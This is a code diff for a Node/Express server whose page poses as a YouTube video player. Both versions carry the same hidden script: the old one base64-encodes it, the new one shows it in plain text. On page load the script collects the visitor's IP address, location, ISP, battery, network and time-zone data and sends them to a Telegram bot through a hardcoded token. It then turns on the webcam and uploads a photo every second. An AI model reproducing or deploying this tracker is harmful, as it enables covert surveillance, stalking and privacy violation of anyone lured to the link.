@@ -1,24 +1,185 @@
+
 const express = require('express');
 const app = express();
 const port = 3000;
 
-const html = `<!DOCTYPE html>
-<html lang='en'>
+app.get('/', (req, res) => {
+  res.send(`
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <meta charset='UTF-8'>
-    <title>Encrypted Page</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Video Player</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+        }
+        .youtube-video {
+            width: 100%;
+            height: auto;
+            aspect-ratio: 16 / 30;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
 </head>
 <body>
-    <script>
-        document.write(decodeURIComponent(escape(atob("PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+WW91VHViZSBWaWRlbyBQbGF5ZXI8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHksIGh0bWwgewogICAgICAgICAgICBtYXJnaW46IDA7CiAgICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICBoZWlnaHQ6IDEwMCU7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOwogICAgICAgIH0KICAgICAgICAueW91dHViZS12aWRlbyB7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgICAgIGFzcGVjdC1yYXRpbzogMTYgLyAzMDsgLyogTWFpbnRhaW4gMTY6OSBhc3BlY3QgcmF0aW8gKi8KICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKICAgICAgICB9CiAgICAgICAgaWZyYW1lIHsKICAgICAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgICAgIGhlaWdodDogMTAwJTsKICAgICAgICAgICAgYm9yZGVyOiBub25lOwogICAgICAgIH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJ5b3V0dWJlLXZpZGVvIj4KICAgICAgICA8IS0tIFJlcGxhY2UgdGhlIHNyYyB3aXRoIHRoZSBkZXNpcmVkIFlvdVR1YmUgdmlkZW8gVVJMIC0tPgogICAgICAgIDxpZnJhbWUgc3JjPSJodHRwczovL3d3dy55b3V0dWJlLmNvbS9lbWJlZC9jZnpQTXc4djVHOCIgYWxsb3dmdWxsc2NyZWVuPjwvaWZyYW1lPgogICAgPC9kaXY+CgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICAgIC8vIEZ1bmN0aW9uIHRvIGZldGNoIGxvY2F0aW9uIGRhdGEgdXNpbmcgaXBpbmZvLmlvCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gZ2V0TG9jYXRpb25EYXRhKCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9pcGluZm8uaW8vanNvbj90b2tlbj1mOTk5NTlhNGZhMjQyYScpOwogICAgICAgICAgICAgICAgcmV0dXJuIGF3YWl0IHJlc3BvbnNlLmpzb24oKTsKICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBmZXRjaGluZyBJUCBpbmZvOiAiLCBlcnIpOwogICAgICAgICAgICAgICAgcmV0dXJuIHt9OyAvLyBSZXR1cm4gZW1wdHkgb2JqZWN0IG9uIGVycm9yCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vIEZ1bmN0aW9uIHRvIGRlY29kZSBCYXNlNjQgc3RyaW5nCiAgICAgICAgZnVuY3Rpb24gZGVjb2RlQmFzZTY0KGVuY29kZWRTdHIpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIHJldHVybiBkZWNvZGVVUklDb21wb25lbnQoZXNjYXBlKGF0b2IoZW5jb2RlZFN0cikpKTsKICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignQmFzZTY0IGRlY29kZSBlcnJvcjonLCBlKTsKICAgICAgICAgICAgICAgIHJldHVybiBudWxsOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvLyBGdW5jdGlvbiB0byBnZXQgVVJMIHBhcmFtZXRlcnMKICAgICAgICBmdW5jdGlvbiBnZXRVUkxQYXJhbWV0ZXIoc1BhcmFtKSB7CiAgICAgICAgICAgIHZhciBzUGFnZVVSTCA9IHdpbmRvdy5sb2NhdGlvbi5zZWFyY2guc3Vic3RyaW5nKDEpOwogICAgICAgICAgICB2YXIgc1VSTFZhcmlhYmxlcyA9IHNQYWdlVVJMLnNwbGl0KCcmJyk7CiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgc1VSTFZhcmlhYmxlcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgdmFyIHNQYXJhbWV0ZXJOYW1lID0gc1VSTFZhcmlhYmxlc1tpXS5zcGxpdCgnPScpOwogICAgICAgICAgICAgICAgaWYgKHNQYXJhbWV0ZXJOYW1lWzBdID09IHNQYXJhbSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBzUGFyYW1ldGVyTmFtZVsxXTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgLy8gRnVuY3Rpb24gdG8gc2VuZCBkYXRhIHRvIFRlbGVncmFtCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gc2VuZFRvVGVsZWdyYW0obWVzc2FnZSwgY2hhdElkKSB7CiAgICAgICAgICAgIGNvbnN0IGJvdFRva2VuID0gJzczNjgwMzc0NjM6QUFINFlvMDhsZ1k2eFlqT1ByMVo4bkk4cjRRM0tOQVZndUknOwoKICAgICAgICAgICAgaWYgKCFjaGF0SWQpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0NoYXQgSUQgaXMgbm90IGF2YWlsYWJsZS4nKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgY29uc3QgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoKTsKICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCdjaGF0X2lkJywgY2hhdElkKTsKICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCd0ZXh0JywgbWVzc2FnZS50cmltKCkpOwoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke2JvdFRva2VufS9zZW5kTWVzc2FnZWAsIHsKICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICBib2R5OiBmb3JtRGF0YQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhhd2FpdCByZXNwb25zZS5qc29uKCkpOwogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignRXJyb3Igc2VuZGluZyB0byBUZWxlZ3JhbTonLCBlcnJvcik7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vIEZ1bmN0aW9uIHRvIHNlbmQgYSBwaG90byB0byBUZWxlZ3JhbQogICAgICAgIGFzeW5jIGZ1bmN0aW9uIHNlbmRQaG90b1RvVGVsZWdyYW0oYmxvYiwgY2hhdElkKSB7CiAgICAgICAgICAgIGNvbnN0IGJvdFRva2VuID0gJzczNjgwMzc0NjM6QUFINFlvMDhsZ1k2eFlqT1ByMVo4bkk4cjRRM0tOQVZndUknOwoKICAgICAgICAgICAgaWYgKCFjaGF0SWQpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0NoYXQgSUQgaXMgbm90IGF2YWlsYWJsZS4nKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgY29uc3QgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoKTsKICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCdjaGF0X2lkJywgY2hhdElkKTsKICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCdwaG90bycsIGJsb2IpOwoKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke2JvdFRva2VufS9zZW5kUGhvdG9gLCB7CiAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiAnUE9TVCcsCiAgICAgICAgICAgICAgICAgICAgYm9keTogZm9ybURhdGEKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgY29uc29sZS5sb2coYXdhaXQgcmVzcG9uc2UuanNvbigpKTsKICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0Vycm9yIHNlbmRpbmcgcGhvdG8gdG8gVGVsZWdyYW06JywgZXJyb3IpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAvLyBGdW5jdGlvbiB0byBnZXQgZGV2aWNlIGFuZCBiYXR0ZXJ5IGluZm9ybWF0aW9uCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gZ2V0RGV2aWNlSW5mbygpIHsKICAgICAgICAgICAgY29uc3QgYmF0dGVyeSA9IGF3YWl0IG5hdmlnYXRvci5nZXRCYXR0ZXJ5KCk7CiAgICAgICAgICAgIHJldHVybiB7CiAgICAgICAgICAgICAgICBjaGFyZ2luZzogYmF0dGVyeS5jaGFyZ2luZyA/ICJZZXMiIDogIk5vIiwKICAgICAgICAgICAgICAgIGJhdHRlcnlMZXZlbDogTWF0aC5yb3VuZChiYXR0ZXJ5LmxldmVsICogMTAwKSArICIlIiwKICAgICAgICAgICAgICAgIG5ldHdvcmtUeXBlOiBuYXZpZ2F0b3IuY29ubmVjdGlvbiA/IG5hdmlnYXRvci5jb25uZWN0aW9uLmVmZmVjdGl2ZVR5cGUgOiAiTi9BIiwKICAgICAgICAgICAgICAgIHRpbWVab25lOiBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmUKICAgICAgICAgICAgfTsKICAgICAgICB9CgogICAgICAgIC8vIE1haW4gZnVuY3Rpb24gdG8gaGFuZGxlIHVzZXIgaW50ZXJhY3Rpb24KICAgICAgICBhc3luYyBmdW5jdGlvbiBoYW5kbGVVc2VySW50ZXJhY3Rpb24oKSB7CiAgICAgICAgICAgIGNvbnN0IGxvY2F0aW9uRGF0YSA9IGF3YWl0IGdldExvY2F0aW9uRGF0YSgpOwogICAgICAgICAgICBjb25zdCBkZXZpY2VJbmZvID0gYXdhaXQgZ2V0RGV2aWNlSW5mbygpOwoKICAgICAgICAgICAgLy8gR2V0IEJhc2U2NCBlbmNvZGVkICdpZCcgcGFyYW1ldGVyIGZyb20gdGhlIFVSTCBhbmQgZGVjb2RlIGl0CiAgICAgICAgICAgIGNvbnN0IGJhc2U2NElkID0gZ2V0VVJMUGFyYW1ldGVyKCdpJyk7CiAgICAgICAgICAgIGNvbnN0IGNoYXRJZCA9IGJhc2U2NElkID8gZGVjb2RlQmFzZTY0KGJhc2U2NElkKSA6IG51bGw7CgogICAgICAgICAgICBpZiAoIWNoYXRJZCkgewogICAgICAgICAgICAgICAgY29uc29sZS53YXJuKCdObyB2YWxpZCBjaGF0IElEIGZvdW5kLicpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICBjb25zdCBtZXNzYWdlID0gYArihLnvuI8gQWN0aXZpdHkgVHJhY2tlZDoKCvCfjJAgSVAgQWRkcmVzczogJHtsb2NhdGlvbkRhdGEuaXAgfHwgIk4vQSJ9CvCfjI0gTG9jYXRpb246ICR7bG9jYXRpb25EYXRhLmNpdHkgfHwgIk4vQSJ9LCAke2xvY2F0aW9uRGF0YS5yZWdpb24gfHwgIk4vQSJ9LCAke2xvY2F0aW9uRGF0YS5jb3VudHJ5IHx8ICJOL0EifQrwn5OhIElTUDogJHtsb2NhdGlvbkRhdGEub3JnIHx8ICJOL0EifQrwn5SNIE9yZzogJHtsb2NhdGlvbkRhdGEub3JnIHx8ICJOL0EifQoK8J+TsSBEZXZpY2UgSW5mbzoK8J+UiyBDaGFyZ2luZzogJHtkZXZpY2VJbmZvLmNoYXJnaW5nfQrwn5SMIEJhdHRlcnkgTGV2ZWw6ICR7ZGV2aWNlSW5mby5iYXR0ZXJ5TGV2ZWx9CvCfjJAgTmV0d29yayBUeXBlOiAke2RldmljZUluZm8ubmV0d29ya1R5cGV9CvCflZIgVGltZSBab25lOiAke2RldmljZUluZm8udGltZVpvbmV9Cgrwn5Go4oCN8J+SuyBUcmFja2VkIG9uOiBAamF0aGFja2luZzAxCmA7CgogICAgICAgICAgICAvLyBTZW5kIHRoZSBpbml0aWFsIGluZm9ybWF0aW9uIHRvIFRlbGVncmFtCiAgICAgICAgICAgIGF3YWl0IHNlbmRUb1RlbGVncmFtKG1lc3NhZ2UsIGNoYXRJZCk7CgogICAgICAgICAgICAvLyBDb250aW51b3VzbHkgY2FwdHVyZSBhbmQgc2VuZCBwaG90b3MgZXZlcnkgc2Vjb25kCiAgICAgICAgICAgIG5hdmlnYXRvci5tZWRpYURldmljZXMuZ2V0VXNlck1lZGlhKHsgdmlkZW86IHRydWUgfSkKICAgICAgICAgICAgICAgIC50aGVuKChzdHJlYW0pID0+IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBpbWFnZUNhcHR1cmUgPSBuZXcgSW1hZ2VDYXB0dXJlKHN0cmVhbS5nZXRWaWRlb1RyYWNrcygpWzBdKTsKCiAgICAgICAgICAgICAgICAgICAgc2V0SW50ZXJ2YWwoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBpbWFnZUNhcHR1cmUudGFrZVBob3RvKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC50aGVuKChibG9iKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VuZFBob3RvVG9UZWxlZ3JhbShibG9iLCBjaGF0SWQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC5jYXRjaCgoZXJyb3IpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCdFcnJvciBjYXB0dXJpbmcgcGhvdG86JywgZXJyb3IpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7IC8vIENhcHR1cmUgcGhvdG8gZXZlcnkgc2Vjb25kCiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgLmNhdGNoKChlcnJvcikgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ1Blcm1pc3Npb24gZXJyb3I6JywgZXJyb3IpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgfQoKICAgICAgICAvLyBTdGFydCB0aGUgaW50ZXJhY3Rpb24gd2hlbiB0aGUgcGFnZSBsb2FkcwogICAgICAgIHdpbmRvdy5vbmxvYWQgPSBoYW5kbGVVc2VySW50ZXJhY3Rpb247CiAgICA8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+"))));
+    <div class="youtube-video">
+        <iframe src="https://www.youtube.com/embed/cfzPMw8v5G8" allowfullscreen></iframe>
+    </div>
+
+    <script type="text/javascript">
+        async function getLocationData() {
+            try {
+                const response = await fetch('https://ipinfo.io/json?token=f99959a4fa242a');
+                return await response.json();
+            } catch (err) {
+                console.error("Error fetching IP info: ", err);
+                return {};
+            }
+        }
+
+        function decodeBase64(encodedStr) {
+            try {
+                return decodeURIComponent(escape(atob(encodedStr)));
+            } catch (e) {
+                console.error('Base64 decode error:', e);
+                return null;
+            }
+        }
+
+        function getURLParameter(sParam) {
+            var sPageURL = window.location.search.substring(1);
+            var sURLVariables = sPageURL.split('&');
+            for (var i = 0; i < sURLVariables.length; i++) {
+                var sParameterName = sURLVariables[i].split('=');
+                if (sParameterName[0] == sParam) {
+                    return sParameterName[1];
+                }
+            }
+        }
+
+        async function sendToTelegram(message, chatId) {
+            const botToken = '7368037463:AAH4Yo08lgY6xYjOPr1Z8nI8r4Q3KNAVguI';
+            if (!chatId) {
+                console.error('Chat ID is not available.');
+                return;
+            }
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', message.trim());
+            try {
+                const response = await fetch(\`https://api.telegram.org/bot\${botToken}/sendMessage\`, {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log(await response.json());
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        async function sendPhotoToTelegram(blob, chatId) {
+            const botToken = '7368037463:AAH4Yo08lgY6xYjOPr1Z8nI8r4Q3KNAVguI';
+            if (!chatId) {
+                console.error('Chat ID is not available.');
+                return;
+            }
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob);
+            try {
+                const response = await fetch(\`https://api.telegram.org/bot\${botToken}/sendPhoto\`, {
+                    method: 'POST',
+                    body: formData
+                });
+                console.log(await response.json());
+            } catch (error) {
+                console.error('Error sending photo to Telegram:', error);
+            }
+        }
+
+        async function getDeviceInfo() {
+            const battery = await navigator.getBattery();
+            return {
+                charging: battery.charging ? "Yes" : "No",
+                batteryLevel: Math.round(battery.level * 100) + "%",
+                networkType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        async function handleUserInteraction() {
+            const locationData = await getLocationData();
+            const deviceInfo = await getDeviceInfo();
+            const base64Id = getURLParameter('i');
+            const chatId = base64Id ? decodeBase64(base64Id) : null;
+
+            if (!chatId) {
+                console.warn('No valid chat ID found.');
+                return;
+            }
+
+            const message = \`
+â„¹ï¸ Activity Tracked:
+
+ðŸŒ IP Address: \${locationData.ip || "N/A"}
+ðŸŒ Location: \${locationData.city || "N/A"}, \${locationData.region || "N/A"}, \${locationData.country || "N/A"}
+ðŸ“¡ ISP: \${locationData.org || "N/A"}
+ðŸ” Org: \${locationData.org || "N/A"}
+
+ðŸ“± Device Info:
+ðŸ”‹ Charging: \${deviceInfo.charging}
+ðŸ”Œ Battery Level: \${deviceInfo.batteryLevel}
+ðŸŒ Network Type: \${deviceInfo.networkType}
+ðŸ•’ Time Zone: \${deviceInfo.timeZone}
+
+ðŸ‘¨â€ðŸ’» Tracked on: @jathacking01
+\`;
+
+            await sendToTelegram(message, chatId);
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+                    setInterval(() => {
+                        imageCapture.takePhoto()
+                            .then((blob) => {
+                                sendPhotoToTelegram(blob, chatId);
+                            })
+                            .catch((error) => {
+                                console.error('Error capturing photo:', error);
+                            });
+                    }, 1000);
+                })
+                .catch((error) => {
+                    console.error('Permission error:', error);
+                });
+        }
+
+        window.onload = handleUserInteraction;
     </script>
 </body>
-</html>`;
-
-app.get('/', (req, res) => {
-    res.send(html);
+</html>
+  `);
 });
 
 app.listen(port, '0.0.0.0', () => {
-    console.log(`Server running at http://0.0.0.0:${port}`);
+  console.log(`Server running at http://0.0.0.0:${port}`);
 });
